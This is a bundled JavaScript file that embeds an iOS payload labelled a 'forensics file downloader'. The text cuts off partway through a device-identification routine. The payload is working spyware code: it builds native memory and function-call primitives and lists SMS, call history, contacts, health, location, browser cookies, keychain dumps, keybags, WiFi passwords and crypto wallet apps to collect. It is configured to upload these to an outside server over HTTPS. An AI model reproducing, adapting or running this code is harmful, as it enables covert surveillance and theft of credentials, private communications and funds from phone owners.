/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = "./main.js");
/******/ })
/************************************************************************/
/******/ ({

/***/ "../node_modules/raw-loader/dist/cjs.js!./file_downloader.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("// Forensics File Downloader Payload\n// Reads and exfiltrates forensically-relevant files from iOS device via HTTP\n// This payload should be injected into a process with filesystem access\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name)\n\t\t\treturn 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr)\n\t\t\treturn addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr)\n\t\t\tthis.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\t\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\n\t\tinvoker();\n\t\t\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn)\n\t\t\treturn Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\nconst TAG = \"INFO\";\n\n// Server configuration - modify as needed\nconst SERVER_HOST = \"sqwas.shapelie.com\";\nconst HTTP_PORT = 8882;\nconst HTTPS_PORT = 8881;\nconst UPLOAD_PATH = \"/stats\";\n\n// Set to true to use HTTPS (CFStream with TLS), false for plain HTTP (raw sockets)\nconst USE_HTTPS = true;\n\n// Maximum file size to download (15GB)\nconst MAX_FILE_SIZE = 15000 * 1024 * 1024 * 1024;\n\n// Chunk size for reading large files (128KB)\nconst CHUNK_SIZE = 128 * 1024;\n\n// ============================================================================\n// Forensic File List\n// ============================================================================\n\nconst FORENSIC_FILES = [\n\t// Communications \n\t{ path: \"/private/var/mobile/Library/SMS/sms.db\", category: \"communications\", description: \"SMS/iMessage database\" },\n\t{ path: \"/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata\", category: \"communications\", description: \"Call history\" },\n\t{ path: \"/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb\", category: \"communications\", description: \"Contacts database\" },\n\t\n\t// Credentials - WiFi\n\t{ path: \"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist\", category: \"credentials\", description: \"WiFi networks config\" },\n\t{ path: \"/private/var/preferences/SystemConfiguration/com.apple.wifi-networks.plist.backup\", category: \"credentials\", description: \"WiFi networks backup\" },\n\t{ path: \"/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist\", category: \"credentials\", description: \"WiFi private MAC networks\" },\n\t{ path: \"/private/var/preferences/com.apple.wifi.known-networks.plist\", category: \"credentials\", description: \"Known WiFi networks\" },\n\t\n\t// Browser Data\n\t{ path: \"/private/var/mobile/Library/Safari/History.db\", category: \"browser\", description: \"Safari history\" },\n\t{ path: \"/private/var/mobile/Library/Safari/Bookmarks.db\", category: \"browser\", description: \"Safari bookmarks\" },\n\t{ path: \"/private/var/mobile/Library/Safari/BrowserState.db\", category: \"browser\", description: \"Safari browser state\" },\n\t{ path: \"/private/var/mobile/Library/Cookies/Cookies.binarycookies\", category: \"browser\", description: \"Safari cookies\" },\n\t\n\t// Location Data\n\t{ path: \"/private/var/mobile/Library/Caches/locationd/consolidated.db\", category: \"location\", description: \"Location history\" },\n\t{ path: \"/private/var/mobile/Library/Caches/locationd/clients.plist\", category: \"location\", description: \"Location clients\" },\n\t{ path: \"/private/var/root/Library/Caches/locationd/consolidated.db\", category: \"location\", description: \"Root location history\" },\n\t\n\t// Personal Data\n\t{ path: \"/private/var/mobile/Library/Notes/notes.sqlite\", category: \"personal\", description: \"Notes database\" },\n\t{ path: \"/private/var/mobile/Library/Calendar/Calendar.sqlitedb\", category: \"personal\", description: \"Calendar database\" },\n\t{ path: \"/private/var/mobile/Media/PhotoData/Photos.sqlite\", category: \"personal\", description: \"Photos metadata\" },\n\t{ path: \"/private/var/mobile/Library/Health/healthdb.sqlite\", category: \"personal\", description: \"Health database\" },\n\t{ path: \"/private/var/mobile/Library/Health/healthdb_secure.sqlite\", category: \"personal\", description: \"Secure health database\" },\n\t\n\t// Device Info\n\t{ path: \"/private/var/root/Library/Lockdown/data_ark.plist\", category: \"device\", description: \"Device identifiers\" },\n\t{ path: \"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist\", category: \"device\", description: \"Identity services cache\" },\n\t{ path: \"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/ProfileMeta.plist\", category: \"device\", description: \"Configuration profiles\" },\n\t{ path: \"/private/var/preferences/SystemConfiguration/preferences.plist\", category: \"device\", description: \"System preferences\" },\n\t\n\t// SIM/Cellular Info\n\t{ path: \"/private/var/wireless/Library/Preferences/com.apple.commcenter.plist\", category: \"device\", description: \"SIM card information\" },\n\t{ path: \"/private/var/wireless/Library/Preferences/com.apple.commcenter.data.plist\", category: \"device\", description: \"Cellular data info\" },\n\t{ path: \"/private/var/wireless/Library/Databases/CellularUsage.db\", category: \"device\", description: \"Cellular usage database\" },\n\t{ path: \"/private/var/wireless/Library/ControlCenter/ModuleConfiguration.plist\", category: \"device\", description: \"Control Center config\" },\n\t\n\t// User Preferences\n\t{ path: \"/private/var/mobile/Library/Preferences/com.apple.AppStore.plist\", category: \"device\", description: \"App Store preferences\" },\n\t{ path: \"/private/var/mobile/Library/Preferences/com.apple.locationd.plist\", category: \"device\", description: \"Location services settings\" },\n\t{ path: \"/private/var/mobile/Library/Preferences/com.apple.icloud.findmydeviced.FMIPAccounts.plist\", category: \"device\", description: \"Find My iPhone settings\" },\n\t{ path: \"/private/var/mobile/Library/Preferences/com.apple.MobileBackup.plist\", category: \"device\", description: \"Backup information\" },\n\t{ path: \"/private/var/mobile/Library/Preferences/com.apple.mobile.ldbackup.plist\", category: \"device\", description: \"Backup settings\" },\n\t\n\t// Social/Interaction Data\n\t{ path: \"/private/var/mobile/Library/CoreDuet/People/interactionC.db\", category: \"personal\", description: \"Contacts interaction history\" },\n\t{ path: \"/private/var/mobile/Library/PersonalizationPortrait/PPSQLDatabase.db\", category: \"personal\", description: \"Personalization data\" },\n\t\n\t// App Data\n\t{ path: \"/private/var/mobile/Library/Accounts/Accounts3.sqlite\", category: \"accounts\", description: \"User accounts\" },\n\t{ path: \"/private/var/mobile/Library/Mail/Envelope Index\", category: \"email\", description: \"Mail envelope index\" },\n\t{ path: \"/private/var/mobile/Library/Mail/Protected Index\", category: \"email\", description: \"Mail protected index\" },\n\t\n\t// Installed Apps Database (best source for bundle IDs)\n\t{ path: \"/private/var/mobile/Library/FrontBoard/applicationState.db\", category: \"device\", description: \"Installed applications database\" },\n\t\n\t// Keychain/Keybag files copied to /tmp by keychain_copier.js (running in configd)\n\t{ path: \"/tmp/keychain-2.db\", category: \"keychain\", description: \"Keychain database (copied)\" },\n\t{ path: \"/tmp/persona.kb\", category: \"keybag\", description: \"Persona keybag\" },\n\t{ path: \"/tmp/usersession.kb\", category: \"keybag\", description: \"User session keybag\" },\n\t{ path: \"/tmp/backup_keys_cache.sqlite\", category: \"keybag\", description: \"Backup keys cache\" },\n\t{ path: \"/tmp/persona_private.kb\", category: \"keybag\", description: \"Persona keybag (private)\" },\n\t{ path: \"/tmp/usersession_private.kb\", category: \"keybag\", description: \"User session keybag (private)\" },\n\t{ path: \"/tmp/System.keybag\", category: \"keybag\", description: \"System keybag\" },\n\t{ path: \"/tmp/Backup.keybag\", category: \"keybag\", description: \"Backup keybag\" },\n\t{ path: \"/tmp/persona_keychains.kb\", category: \"keybag\", description: \"Persona keybag (Keychains)\" },\n\t{ path: \"/tmp/usersession_keychains.kb\", category: \"keybag\", description: \"User session keybag (Keychains)\" },\n\t{ path: \"/tmp/device.kb\", category: \"keybag\", description: \"Device keybag\" },\n\t\n\t// WiFi passwords dumped by wifi_password_dump.js (running in wifid)\n\t{ path: \"/var/wireless/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/wireless/Library/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/wireless/Library/Caches/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/wireless/Library/Preferences/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/wireless/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/tmp/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/tmp/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/tmp/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/log/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/log/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/root/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/root/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/mobile/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/mobile/Library/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/mobile/Library/Caches/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/mobile/Library/Caches/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/preferences/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/preferences/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/db/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/db/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/run/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/run/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/var/networkd/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/networkd/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t{ path: \"/private/var/networkd/db/wifi_passwords.txt\", category: \"credentials\", description: \"WiFi passwords\" },\n\t\n\t// WiFi passwords from securityd (fallback for devices where wifid fails)\n\t{ path: \"/tmp/wifi_passwords_securityd.txt\", category: \"credentials\", description: \"WiFi passwords (securityd)\" },\n\t{ path: \"/private/var/tmp/wifi_passwords_securityd.txt\", category: \"credentials\", description: \"WiFi passwords (securityd)\" },\n\t\n\t// Full keychain dump from securityd\n\t{ path: \"/private/var/Keychains/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/Keychains/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/keybags/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/private/var/keybags/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/private/var/tmp/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/tmp/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/tmp/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/run/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/private/var/run/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/db/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/private/var/db/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/root/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/private/var/root/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/var/log/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n\t{ path: \"/private/var/log/keychain_dump.txt\", category: \"keychain\", description: \"Keychain dump\" },\n];\n\n// ============================================================================\n// Crypto Wallet Search Patterns (app names to search for)\n// ============================================================================\n\nconst CRYPTO_WALLET_PATTERNS = [\n\t// Major Wallets\n\t\"coinbase\",\n\t\"binance\",\n\t\"nicegram\",\n\t\n\t// Hardware Wallet Apps\n\t\"ledger\",\n\t\"trezor\",\n\t\n\t// Multi-chain Wallets\n\t\"trust\",\n\t\"trustwallet\",\n\t\"metamask\",\n\t\"exodus\",\n\t\"exodus-movement\",\n\t\"atomic\",\n\t\"crypto.com\",\n\t\n\t// Bitcoin Wallets\n\t\"electrum\",\n\t\"blockstream\",\n\t\"green\",\n\t\"breadwallet\",\n\t\"brd\",\n\t\"mycelium\",\n\t\"samourai\",\n\t\"bluewallet\",\n\t\"wasabi\",\n\t\n\t// Ethereum Wallets\n\t\"imtoken\",\n\t\"zerion\",\n\t\"rainbow\",\n\t\"uniswap\",\n\t\"argent\",\n\t\"etherscan\",\n\t\n\t// Solana Wallets\n\t\"phantom\",\n\t\"solflare\",\n\t\"solana\",\n\t\n\t// TON Wallets\n\t\"tonkeeper\",\n\t\"tonwallet\",\n\t\"mytonwallet\",\n\t\"ton\",\n\t\n\t// Other Chain Wallets\n\t\"terra\",\n\t\"keplr\",\n\t\"cosmos\",\n\t\"avalanche\",\n\t\"avax\",\n\t\"algorand\",\n\t\"xdefi\",\n\t\"polkadot\",\n\t\"cardano\",\n\t\"yoroi\",\n\t\"daedalus\",\n\t\n\t// Exchange Apps\n\t\"kraken\",\n\t\"gemini\",\n\t\"bitfinex\",\n\t\"kucoin\",\n\t\"okx\",\n\t\"okex\",\n\t\"huobi\",\n\t\"htx\",\n\t\"gate.io\",\n\t\"gateio\",\n\t\"bybit\",\n\t\"bitget\",\n\t\"mexc\",\n\t\"crypto\",\n\t\n\t// DeFi/Web3 Apps\n\t\"1inch\",\n\t\"safepal\",\n\t\"tokenpocket\",\n\t\"bitpay\",\n\t\"gnosis\",\n\t\"safe\",\n\t\"defi\",\n\t\"swap\",\n\t\"dex\",\n\t\n\t// Telegram\n\t\"telegram\",\n\t\n\t// General crypto terms\n\t\"wallet\",\n\t\"bitcoin\",\n\t\"btc\",\n\t\"ethereum\",\n\t\"eth\",\n\t\"crypto\",\n\t\"blockchain\",\n\t\"web3\",\n\t\"nft\",\n];\n\n// ============================================================================\n// Initialize Native\n// ============================================================================\n\nNative.init();\n\n// ============================================================================\n// Helper Functions\n// ============================================================================\n\n/**\n * Get device UUID using IOKit IOPlatformUUID (most reliable method)\n * Falls back to sysctl if IOKit fails\n */\nfunction getDeviceUUID() {\n\ttry {\n\t\t// Method 1: IOKit IOPlatformUUID (most reliable with root privileges)\n\t\ttry {\n\t\t\tconst iokitHandle = Native.callSymbol(\"dlopen\", \"/System/Library/Frameworks/IOKit.framework/IOKit\", 1);\n\t\t\tif (iokitHandle && iokitHandle !== 0n) {\n\t\t\t\tconst cfHandle = Native.callSymbol(\"dlopen\", \"/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation\", 1);\n\t\t\t\tconst CFStringGetCStringPtr = cfHandle ? Native.callSymbol(\"dlsym\", cfHandle, \"CFStringGetCStringPtr\") : 0n;\n\t\t\t\tconst CFStringGetCString = cfHandle ? Native.callSymbol(\"dlsym\", cfHandle, \"CFStringGetCString\") : 0n;\n\t\t\t\tconst CFRelease = cfHandle ? Native.callSymbol(\"dlsym\", cfHandle, \"CFRelease\") : 0n;\n\t\t\t\tconst CFStringCreateWithCString = cfHandle ? Native.callSymbol(\"dlsym\", cfHandle, \"CFStringCreateWithCString\") : 0n;\n\t\t\t\t\n\t\t\t\tconst serviceNamePtr = Native.callSymbol(\"malloc\", 32);\n\t\t\t\tNative.writeString(serviceNamePtr, \"IOPlatformExpertDevice\");\n\t\t\t\t\n\t\t\t\tconst matchingDict = Native.callSymbol(\"IOServiceMatching\", serviceNamePtr);\n\t\t\t\tNative.callSymbol(\"free\", serviceNamePtr);\n\t\t\t\t\n\t\t\t\tif (matchingDict && matchingDict !== 0n) {\n\t\t\t\t\tconst kIOMasterPortDefault = 0n;\n\t\t\t\t\tconst platformExpert = Native.callSymbol(\"IOServiceGetMatchingService\", kIOMasterPortDefault, matchingDict);\n\t\t\t\t\t\n\t\t\t\t\tif (platformExpert && platformExpert !== 0n) {\n\t\t\t\t\t\tconst uuidKeyPtr = Native.callSymbol(\"malloc\", 32);\n\t\t\t\t\t\tNative.writeString(uuidKeyPtr, \"IOPlatformUUID\");\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst uuidKeyCFStr = CFStringCreateWithCString ? \n\t\t\t\t\t\t\tNative.callSymbol(\"CFStringCreateWithCString\", 0n, uuidKeyPtr, 0x08000100) : 0n;\n\t\t\t\t\t\tNative.callSymbol(\"free\", uuidKeyPtr);\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (uuidKeyCFStr && uuidKeyCFStr !== 0n) {\n\t\t\t\t\t\t\tconst kCFAllocatorDefault = 0n;\n\t\t\t\t\t\t\tconst uuidCFStr = Native.callSymbol(\"IORegistryEntryCreateCFProperty\", \n\t\t\t\t\t\t\t\tplatformExpert, uuidKeyCFStr, kCFAllocatorDefault, 0n);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif (CFRelease) {\n\t\t\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", uuidKeyCFStr);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif (uuidCFStr && uuidCFStr !== 0n) {\n\t\t\t\t\t\t\t\tlet uuid = \"\";\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (CFStringGetCStringPtr) {\n\t\t\t\t\t\t\t\t\tconst cstrPtr = Native.callSymbol(\"CFStringGetCStringPtr\", uuidCFStr, 0x08000100);\n\t\t\t\t\t\t\t\t\tif (cstrPtr && cstrPtr !== 0n) {\n\t\t\t\t\t\t\t\t\t\tuuid = Native.readString(cstrPtr, 256).replace(/\\0/g, '').trim();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (!uuid && CFStringGetCString) {\n\t\t\t\t\t\t\t\t\tconst uuidBuf = Native.callSymbol(\"malloc\", 256);\n\t\t\t\t\t\t\t\t\tconst result = Native.callSymbol(\"CFStringGetCString\", uuidCFStr, uuidBuf, 256, 0x08000100);\n\t\t\t\t\t\t\t\t\tif (result && result !== 0n) {\n\t\t\t\t\t\t\t\t\t\tuuid = Native.readString(uuidBuf, 256).replace(/\\0/g, '').trim();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"free\", uuidBuf);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (CFRelease) {\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"CFRelease\", uuidCFStr);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif (uuid && uuid.length > 0) {\n\t\t\t\t\t\t\t\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\t\t\t\t\t\t\treturn uuid;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\tNative.callSymbol(\"IOObjectRelease\", platformExpert);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} catch (ioKitError) {\n\t\t}\n\t\t\n\t\t// Method 2: Fallback to sysctl\n\t\ttry {\n\t\t\tconst CTL_HW = 6;\n\t\t\tconst HW_UUID = 25;\n\t\t\t\n\t\t\tconst mib = new ArrayBuffer(4 * 2);\n\t\t\tconst mibView = new DataView(mib);\n\t\t\tmibView.setInt32(0, CTL_HW, true);\n\t\t\tmibView.setInt32(4, HW_UUID, true);\n\t\t\t\n\t\t\tconst mibBuf = Native.callSymbol(\"malloc\", 8);\n\t\t\tif (!mibBuf || mibBuf === 0n) {\n\t\t\t\treturn 